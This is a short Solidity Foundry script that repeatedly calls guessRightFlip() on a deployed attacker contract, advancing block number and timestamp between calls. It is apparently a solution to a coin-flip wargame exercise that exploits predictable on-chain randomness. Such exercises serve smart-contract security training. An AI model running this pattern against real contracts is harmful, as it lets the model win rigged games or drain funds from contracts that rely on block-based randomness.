// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;
import "forge-std/Script.sol";
import {AttackerContract} from "../src/AttackerContract.sol";

contract AttackScript is Script {
    function setUp() public {}
    address AttackContractAddress = 0xF3F0ad7BA0053Fa439D927E85546d14285644F31;
    function run() public {
        vm.startBroadcast();
        for (uint8 i = 0; i < 10; i++) {
            AttackerContract(AttackContractAddress).guessRightFlip();
            vm.warp(block.timestamp + 15);
            vm.roll(block.number + 1);
            vm.sleep(15000);
        }
        vm.stopBroadcast();
    }
}